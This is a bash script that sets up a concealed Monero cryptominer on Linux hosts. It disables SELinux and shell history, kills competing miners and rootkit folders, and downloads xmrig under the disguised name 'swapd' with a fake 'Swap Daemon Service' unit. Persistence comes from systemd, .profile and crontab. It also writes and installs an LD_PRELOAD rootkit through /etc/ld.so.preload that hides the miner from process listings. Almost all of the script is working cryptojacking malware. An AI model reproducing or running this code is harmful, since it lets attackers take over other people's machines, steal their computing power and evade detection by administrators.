#!/bin/bash

# Function to check if a directory exists before navigating to it
check_directory() {
    if [ -d "$1" ]; then
        cd "$1" || return 1
        return 0
    else
        echo "Directory $1 does not exist, skipping."
        return 1
    fi
}

# Function to detect package manager and run appropriate commands
detect_package_manager() {
    if command -v apt >/dev/null 2>&1; then
        echo "Detected apt package manager"
        PKG_MANAGER="apt"
    elif command -v yum >/dev/null 2>&1; then
        echo "Detected yum package manager"
        PKG_MANAGER="yum"
    elif command -v zypper >/dev/null 2>&1; then
        echo "Detected zypper package manager"
        PKG_MANAGER="zypper"
    else
        echo "No supported package manager found"
        PKG_MANAGER="none"
    fi
}

# Function to safely install packages
install_packages() {
    local packages="$1"
    
    case $PKG_MANAGER in
        apt)
            NEEDRESTART_MODE=a apt-get install -y $packages
            ;;
        yum)
            yum install -y $packages
            ;;
        zypper)
            zypper install -y $packages
            ;;
        *)
            echo "Cannot install packages: no supported package manager found"
            return 1
            ;;
    esac
}

# Initialize package manager detection
detect_package_manager

sudo setenforce 0  # Temporarily disable

# Fix repository issues based on detected package manager
if [ "$PKG_MANAGER" = "yum" ]; then
    echo "Checking and fixing YUM repositories if needed"
    # Only run if CentOS/RHEL repos exist and need fixing
    if [ -d "/etc/yum.repos.d" ] && [ -f "/etc/yum.repos.d/CentOS-Base.repo" ]; then
        echo "Fixing CentOS/RHEL repositories"
        sudo curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
        sudo yum clean all && sudo yum makecache
    fi
    
    # Only fix MariaDB repo if it exists and needs fixing
    if [ -f "/etc/yum.repos.d/mariadb.repo" ]; then
        echo "Fixing MariaDB repository"
        sudo rm -f /etc/yum.repos.d/mariadb.repo
        sudo tee /etc/yum.repos.d/mariadb.repo <<'EOF'
[mariadb]
name = MariaDB
baseurl = https://mirror.mariadb.org/yum/10.11/rhel7-amd64
gpgkey=https://mirror.mariadb.org/yum/RPM-GPG-KEY-MariaDB
gpgcheck=1
EOF
    fi
fi

# ====== MODIFIED EMERGENCY HANDLING ======
# Create a safer emergency pipe mechanism
if [ -e /tmp/emergency_pipe ]; then
    rm -f /tmp/emergency_pipe
fi
mkfifo /tmp/emergency_pipe

# Replace the existing emergency pipe section with:
(
    sleep 30
    echo "[WARNING] Emergency timer triggered - continuing anyway" >&2
    # Instead of exiting, just kill potential problematic processes
    pkill -f "sleep \$timeout"  # Kill timeout killers
    rm -f /tmp/emergency_pipe
) &

# Set up safer trap handling
trap '
    echo "CLEANING UP..."; 
    kill %1 2>/dev/null;
    exec 1>&3 2>&4;
    exit 0  # Changed from exit 1 to prevent abrupt termination
' SIGTERM SIGINT SIGHUP

# ======== SSH PRESERVATION ========
echo "[*] Ensuring SSH access is preserved"
systemctl restart sshd
if [ -f "/etc/ssh/sshd_config" ]; then
    # Only add if not already present
    if ! grep -q "ClientAliveInterval" /etc/ssh/sshd_config; then
        echo "ClientAliveInterval 10" >> /etc/ssh/sshd_config
    fi
    if ! grep -q "ClientAliveCountMax" /etc/ssh/sshd_config; then
        echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
    fi
    systemctl reload sshd
else
    echo "WARNING: sshd_config not found, cannot configure SSH keepalive"
fi

# Timeout and self-healing execution
timeout_run() {
    local timeout=5  # seconds
    local cmd="$@"
    
    # Run command in background
    $cmd &
    local pid=$!
    
    # Start timeout killer
    (sleep $timeout && kill -9 $pid 2>/dev/null) &
    local killer=$!
    
    # Wait for command completion
    wait $pid 2>/dev/null
    kill -9 $killer 2>/dev/null  # Cancel killer if command finished
}

# Command timeout with logging
safe_run() {
    local timeout=25
    echo "[SAFE_RUN] $@"
    timeout $timeout "$@"
    local status=$?
    if [ $status -eq 124 ]; then
        echo "[TIMEOUT] Command failed: $@"
        return 1
    fi
    return $status
}

# Add resilient command execution
run_resilient() {
    for i in {1..3}; do
        "$@" && return 0
        echo "[RETRY $i/3] Failed: $@"
        sleep $((RANDOM % 5 + 1))
    done
    echo "[WARNING] Ultimate failure: $@ - continuing anyway"
    return 0
}

# Secure history handling
unset HISTFILE
export HISTFILE=/dev/null

# Safely stop and disable services
systemctl stop gdm2 2>/dev/null || echo "gdm2 service not found"
systemctl disable gdm2 --now 2>/dev/null || echo "gdm2 service not found"
systemctl stop swapd 2>/dev/null || echo "swapd service not found"
systemctl disable swapd --now 2>/dev/null || echo "swapd service not found"

# Safely kill processes
safe_run pkill -f "swapd" || echo "No swapd processes found"
safe_run pkill -f "kswapd0" || echo "No kswapd0 processes found"

# Safely remove files with chattr protection
remove_protected_dir() {
    local dir="$1"
    if [ -d "$dir" ]; then
        safe_run chattr -i "$dir" 2>/dev/null
        safe_run chattr -i "$dir"/* 2>/dev/null
        safe_run chattr -i "$dir/.swapd" 2>/dev/null
        safe_run rm -rf "$dir"
    fi
}

# Clean up various directories
remove_protected_dir ".swapd"
remove_protected_dir ".gdm"
remove_protected_dir ".gdm2_manual"
remove_protected_dir ".gdm2_manual_*"
remove_protected_dir ".gdm2"

# Remove service files
if [ -f "/etc/systemd/system/swapd.service" ]; then
    safe_run chattr -i /etc/systemd/system/swapd.service
    safe_run rm -f /etc/systemd/system/swapd.service
fi

if [ -f "/etc/systemd/system/gdm2.service" ]; then
    safe_run chattr -i /etc/systemd/system/gdm2.service
    safe_run rm -f /etc/systemd/system/gdm2.service
fi

# Safely navigate to directories
if check_directory "/tmp"; then
    if check_directory ".ICE-unix" 2>/dev/null || check_directory ".X11-unix" 2>/dev/null; then
        # Clean up rootkit directories
        remove_protected_dir "Reptile"
        remove_protected_dir "Nuk3Gh0st"
    fi
fi

# Install curl if needed
if ! command -v curl >/dev/null 2>&1; then
    install_packages "curl"
fi

VERSION=2.11

# Printing greetings
echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not advised to run this script under root"
fi

# Command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

echo "[*] Checking prerequisites..."

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_swapd_processhider.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=$(echo $WALLET | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

# Check for required utilities
for cmd in curl lscpu; do
  if ! command -v $cmd >/dev/null 2>&1; then
    echo "WARNING: This script requires \"$cmd\" utility to work correctly"
    install_packages $cmd
  fi
done

echo "[*] Calculating port..."
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! command -v bc >/dev/null 2>&1; then
    if [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
  fi
}

echo "[*] Printing intentions..."
echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.swapd/swapd.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi
echo

echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo
echo "Sleeping for 3 seconds before continuing (press Ctrl+C to cancel)"
sleep 3
echo
echo

echo "[*] Start doing stuff: preparing miner..."
echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service 2>/dev/null || true
  sudo systemctl stop gdm2.service 2>/dev/null || true
fi

safe_run pkill -9 xmrig || true
safe_run pkill -9 kswapd0 || true

echo "[*] Removing previous directories..."
rm -rf $HOME/moneroocean 2>/dev/null || true
rm -rf $HOME/.moneroocean 2>/dev/null || true
rm -rf $HOME/.gdm2* 2>/dev/null || true

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download xmrig.tar.gz, trying alternative method"
  if ! wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz; then
    echo "ERROR: Both curl and wget failed to download xmrig.tar.gz"
  fi
fi

echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd/"
mkdir -p $HOME/.swapd/
if ! tar xzf /tmp/xmrig.tar.gz -C $HOME/.swapd/; then
  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd/ directory"
else
  rm /tmp/xmrig.tar.gz
fi

echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
$HOME/.swapd/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.swapd/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.swapd/xmrig is not functional"
  else
    echo "WARNING: Advanced version of $HOME/.swapd/xmrig was removed by antivirus (or some other problem)"
  fi
  
  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o '".*"' | sed 's/"//g')
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"$(curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" | cut -d \" -f2)
  
  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    if ! wget --no-check-certificate $LATEST_XMRIG_LINUX_RELEASE -O /tmp/xmrig.tar.gz; then
      echo "ERROR: Both curl and wget failed to download the latest xmrig"
    fi
  fi
  
  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.swapd/"
  if ! tar xzf /tmp/xmrig.tar.gz -C $HOME/.swapd --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.swapd/ directory"
  fi
  
  rm -f /tmp/xmrig.tar.gz
  
  # Try to get config.json from alternative sources
  if [ ! -f "$HOME/.swapd/config.json" ]; then
    echo "[*] Downloading config.json from alternative source"
    if ! curl -s https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json; then
      if ! wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.swapd/config.json; then
        echo "ERROR: Failed to download config.json"
      fi
    fi
  fi
  
  echo "[*] Checking if stock version of $HOME/.swapd/xmrig works fine"
  if [ -f "$HOME/.swapd/config.json" ]; then
    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
  fi
  
  if [ -f "$HOME/.swapd/xmrig" ]; then
    $HOME/.swapd/xmrig --help >/dev/null
    if (test $? -ne 0); then
      echo "ERROR: Stock version of $HOME/.swapd/xmrig is not functional"
    fi
  else
    echo "ERROR: xmrig binary not found"
  fi
fi

if [ -f "$HOME/.swapd/xmrig" ]; then
  echo "[*] Miner $HOME/.swapd/xmrig is OK"
  echo "[*] Renaming xmrig to swapd"
  mv $HOME/.swapd/xmrig $HOME/.swapd/swapd

  # Configure miner
  if [ -f "$HOME/.swapd/config.json" ]; then
    echo "[*] Configuring miner"
    sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.swapd/config.json
    sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
    sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
    sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.swapd/config.json
  else
    echo "ERROR: config.json not found"
  fi

  # Create background config
  if [ -f "$HOME/.swapd/config.json" ]; then
    cp $HOME/.swapd/config.json $HOME/.swapd/config_background.json
    sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_background.json
  fi

  # Safely kill any running instances
  safe_run pkill -f xmrig || true

  # Create startup script
  echo "[*] Creating $HOME/.swapd/swapd.sh script"
  cat >$HOME/.swapd/swapd.sh <<EOL
#!/bin/bash
if ! pidof swapd >/dev/null; then
  nice $HOME/.swapd/swapd \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall swapd\" or \"sudo killall swapd\" if you want to remove background miner first."
fi
EOL
  chmod +x $HOME/.swapd/swapd.sh

  # Setup autostart
  echo "[*] Setting up autostart"
  if ! sudo -n true 2>/dev/null; then
    if ! grep -q ".swapd/swapd.sh" $HOME/.profile; then
      echo "[*] Adding $HOME/.swapd/swapd.sh script to $HOME/.profile"
      echo "$HOME/.swapd/swapd.sh --config=$HOME/.swapd/config.json >/dev/null 2>&1" >>$HOME/.profile
    else
      echo "Looks like $HOME/.swapd/swapd.sh script is already in the $HOME/.profile"
    fi
    
    echo "[*] Running miner in the background"
    bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
  else
    # Check for huge pages support
    if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
      echo "[*] Enabling huge pages"
      echo "vm.nr_hugepages=$((1168 + $(nproc)))" | sudo tee -a /etc/sysctl.conf
      sudo sysctl -w vm.nr_hugepages=$((1168 + $(nproc)))
    fi
    
    if ! command -v systemctl >/dev/null 2>&1; then
      echo "[*] Running miner in the background"
      bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
      echo "WARNING: systemctl not found, cannot create systemd service"
    else
      echo "[*] Creating swapd systemd service"
      cat >/tmp/swapd.service <<EOL
[Unit]
Description=Swap Daemon Service

[Service]
ExecStart=$HOME/.swapd/swapd --config=$HOME/.swapd/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
      sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
      
      echo "[*] Starting swapd systemd service"
      safe_run sudo killall swapd 2>/dev/null || true
      sudo systemctl daemon-reload
      sudo systemctl enable swapd.service
      echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
    fi
  fi
else
  echo "ERROR: Miner binary not found or not executable"
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"

# CPU usage limiting recommendations
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similar commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e swapd -l $((75 * $CPU_THREADS)) -b"
  
  if [ -f "/etc/rc.local" ]; then
    if [ "$(tail -n1 /etc/rc.local)" != "exit 0" ]; then
      echo "sudo sed -i -e '\$acpulimit -e swapd -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
    else
      echo "sudo sed -i -e '\$i \\cpulimit -e swapd -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
    fi
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config_background.json"
fi

echo ""

# Hardware detection
echo "[*] Detecting hardware"
if command -v lspci >/dev/null 2>&1; then
  echo "PCI devices:"
  lspci -vs 00:01.0 2>/dev/null || echo "No PCI info available"
else
  install_packages "pciutils"
  update-pciids 2>/dev/null || true
  lspci -vs 00:01.0 2>/dev/null || echo "No PCI info available"
fi

# GPU detection
echo "Checking for NVIDIA GPU:"
if command -v nvidia-smi >/dev/null 2>&1; then
  nvidia-smi || echo "NVIDIA GPU not found or driver not installed"
else
  echo "nvidia-smi not found"
fi

echo "Checking for AMD GPU:"
if command -v aticonfig >/dev/null 2>&1; then
  aticonfig --odgc --odgt || echo "AMD GPU not found or driver not installed"
else
  echo "aticonfig not found"
fi

echo "Possible CPU Threads: $(nproc)"

# CPU optimization
optimize_func() {
  echo "[*] Attempting CPU optimization"
  
  # Check for MSR module
  MSR_FILE=/sys/module/msr/parameters/allow_writes
  if test -e "$MSR_FILE"; then
    echo on >$MSR_FILE
  else
    modprobe msr allow_writes=on 2>/dev/null || echo "Failed to load MSR module"
  fi
  
  # CPU-specific optimizations
  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo >/dev/null; then
    if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo >/dev/null; then
      if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo >/dev/null; then
        echo "Detected Zen4 CPU"
        wrmsr -a 0xc0011020 0x4400000000000 2>/dev/null || echo "Failed to set MSR 0xc0011020"
        wrmsr -a 0xc0011021 0x4000000000040 2>/dev/null || echo "Failed to set MSR 0xc0011021"
        wrmsr -a 0xc0011022 0x8680000401570000 2>/dev/null || echo "Failed to set MSR 0xc0011022"
        wrmsr -a 0xc001102b 0x2040cc10 2>/dev/null || echo "Failed to set MSR 0xc001102b"
        echo "MSR register values for Zen4 applied"
      else
        echo "Detected Zen3 CPU"
        wrmsr -a 0xc0011020 0x4480000000000 2>/dev/null || echo "Failed to set MSR 0xc0011020"
        wrmsr -a 0xc0011021 0x1c000200000040 2>/dev/null || echo "Failed to set MSR 0xc0011021"
        wrmsr -a 0xc0011022 0xc000000401500000 2>/dev/null || echo "Failed to set MSR 0xc0011022"
        wrmsr -a 0xc001102b 0x2000cc14 2>/dev/null || echo "Failed to set MSR 0xc001102b"
        echo "MSR register values for Zen3 applied"
      fi
    else
      echo "Detected Zen1/Zen2 CPU"
      wrmsr -a 0xc0011020 0 2>/dev/null || echo "Failed to set MSR 0xc0011020"
      wrmsr -a 0xc0011021 0x40 2>/dev/null || echo "Failed to set MSR 0xc0011021"
      wrmsr -a 0xc0011022 0x1510000 2>/dev/null || echo "Failed to set MSR 0xc0011022"
      wrmsr -a 0xc001102b 0x2000cc16 2>/dev/null || echo "Failed to set MSR 0xc001102b"
      echo "MSR register values for Zen1/Zen2 applied"
    fi
  elif grep "Intel" /proc/cpuinfo >/dev/null; then
    echo "Detected Intel CPU"
    wrmsr -a 0x1a4 0xf 2>/dev/null || echo "Failed to set MSR 0x1a4"
    echo "MSR register values for Intel applied"
  else
    echo "No supported CPU detected for MSR optimization"
  fi
  
  # Hugepages setup
  echo "Setting up hugepages"
  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || echo "Failed to set hugepages"
  
  # Try to set 1GB pages if available
  if [ -d "/sys/devices/system/node" ]; then
    for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null); do
      if [ -f "$i/hugepages/hugepages-1048576kB/nr_hugepages" ]; then
        echo 3 >"$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null || echo "Failed to set 1GB pages for $i"
      fi
    done
  fi
  
  echo "CPU optimization completed"
}

# Run CPU optimization if root
if [ $(id -u) = 0 ]; then
  echo "Running as root, performing CPU optimization"
  optimize_func
else
  echo "Not running as root, skipping CPU optimization"
  # Still try to set hugepages
  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || echo "Failed to set hugepages (requires root)"
fi

# Create emergency swap to prevent OOM
create_swap() {
  echo "[*] Checking if swap is needed"
  SWAP_SIZE=2G
  TOTAL_MEM=$(free -m | grep Mem | awk '{print $2}')
  
  if [ $TOTAL_MEM -lt 2000 ]; then
    echo "[*] System has less than 2GB RAM, creating $SWAP_SIZE swap file"
    
    # Check if swap already exists
    if free | grep -q Swap && [ "$(free | grep Swap | awk '{print $2}')" -gt 0 ]; then
      echo "Swap already exists, skipping creation"
      return
    fi
    
    # Create swap file
    if [ ! -f /swapfile ]; then
      echo "Creating swap file at /swapfile"
      sudo fallocate -l $SWAP_SIZE /swapfile 2>/dev/null || sudo dd if=/dev/zero of=/swapfile bs=1G count=2 2>/dev/null
      sudo chmod 600 /swapfile
      sudo mkswap /swapfile
      sudo swapon /swapfile
      
      # Make swap permanent
      if ! grep -q "/swapfile" /etc/fstab; then
        echo "/swapfile none swap sw 0 0" | sudo tee -a /etc/fstab
      fi
      
      echo "Swap file created and activated"
    else
      echo "Swap file already exists at /swapfile"
    fi
  else
    echo "System has sufficient RAM, no swap needed"
  fi
}

# Run swap creation if root
if [ $(id -u) = 0 ]; then
  create_swap
else
  echo "Not running as root, skipping swap creation"
fi

# Process hiding installation
install_process_hider() {
  echo "[*] Setting up process hiding"
  
  # Create directory for process hider
  mkdir -p $HOME/.swapd/processhider
  
  # Download or create process hider source
  cat >$HOME/.swapd/processhider/processhider.c <<EOL
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static const char* process_to_filter = "swapd";

// Function pointer types for the hooked functions
typedef struct dirent* (*readdir_t)(DIR *dirp);
typedef int (*readdir_r_t)(DIR *dirp, struct dirent *entry, struct dirent **result);
typedef struct dirent64* (*readdir64_t)(DIR *dirp);
typedef int (*readdir64_r_t)(DIR *dirp, struct dirent64 *entry, struct dirent64 **result);

// Original function pointers
static readdir_t original_readdir = NULL;
static readdir_r_t original_readdir_r = NULL;
static readdir64_t original_readdir64 = NULL;
static readdir64_r_t original_readdir64_r = NULL;

// Initialize original function pointers
void init_original_functions() {
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    original_readdir_r = dlsym(RTLD_NEXT, "readdir_r");
    original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    original_readdir64_r = dlsym(RTLD_NEXT, "readdir64_r");
}

// Check if the process should be hidden
int should_hide(const char* name) {
    return (name && strstr(name, process_to_filter) != NULL);
}

// Hooked readdir
struct dirent* readdir(DIR *dirp) {
    if (!original_readdir) init_original_functions();
    
    struct dirent* dir;
    
    while (1) {
        dir = original_readdir(dirp);
        
        if (dir == NULL || !should_hide(dir->d_name)) {
            break;
        }
    }
    
    return dir;
}

// Hooked readdir_r
int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    if (!original_readdir_r) init_original_functions();
    
    int ret;
    
    do {
        ret = original_readdir_r(dirp, entry, result);
    } while (ret == 0 && *result != NULL && should_hide((*result)->d_name));
    
    return ret;
}

// Hooked readdir64
struct dirent64* readdir64(DIR *dirp) {
    if (!original_readdir64) init_original_functions();
    
    struct dirent64* dir;
    
    while (1) {
        dir = original_readdir64(dirp);
        
        if (dir == NULL || !should_hide(dir->d_name)) {
            break;
        }
    }
    
    return dir;
}

// Hooked readdir64_r
int readdir64_r(DIR *dirp, struct dirent64 *entry, struct dirent64 **result) {
    if (!original_readdir64_r) init_original_functions();
    
    int ret;
    
    do {
        ret = original_readdir64_r(dirp, entry, result);
    } while (ret == 0 && *result != NULL && should_hide((*result)->d_name));
    
    return ret;
}
EOL

  # Create Makefile
  cat >$HOME/.swapd/processhider/Makefile <<EOL
CC=gcc
CFLAGS=-Wall -fPIC -DPIC -g -O2
LDFLAGS=-shared -ldl

TARGET=libprocesshider.so

all: \$(TARGET)

\$(TARGET): processhider.c
	\$(CC) \$(CFLAGS) \$(LDFLAGS) -o \$@ \$<

install: \$(TARGET)
	cp \$(TARGET) /usr/local/lib/
	echo "/usr/local/lib/\$(TARGET)" > /etc/ld.so.preload

clean:
	rm -f \$(TARGET)
EOL

  # Compile process hider
  echo "[*] Compiling process hider"
  cd $HOME/.swapd/processhider
  make
  
  # Install process hider if root
  if [ $(id -u) = 0 ]; then
    echo "[*] Installing process hider system-wide"
    make install
    echo "Process hider installed successfully"
  else
    echo "[*] Not running as root, cannot install process hider system-wide"
    echo "To install process hider, run the following commands as root:"
    echo "cd $HOME/.swapd/processhider && sudo make install"
  fi
}

# Install process hider
install_process_hider

# Final setup and verification
echo "[*] Setup completed"
echo "Miner is now running in the background"
echo "To check status: ps aux | grep swapd"
echo "To stop miner: killall swapd"
echo "To start miner: $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config.json"

# Print mining stats
echo "[*] Mining to wallet: $WALLET"
echo "You can check your mining stats at: https://moneroocean.stream/?addr=$WALLET"

# Cleanup
rm -rf /tmp/xmrig.tar.gz 2>/dev/null
rm -rf /tmp/moneroocean 2>/dev/null

# Final security check
if [ -f "$HOME/.swapd/swapd" ] && [ -f "$HOME/.swapd/config.json" ]; then
  echo "[*] Verifying installation"
  if pgrep -x swapd >/dev/null; then
    echo "Miner is running properly"
  else
    echo "WARNING: Miner is not running. Starting it now..."
    $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
  fi
else
  echo "ERROR: Installation failed. Key files are missing."
fi

# Add persistence through crontab
if command -v crontab >/dev/null 2>&1; then
  echo "[*] Adding persistence through crontab"
  (crontab -l 2>/dev/null; echo "*/15 * * * * $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1") | crontab -
  echo "Crontab entry added for persistence"
fi

echo "[*] All done! Happy mining!"
exit 0

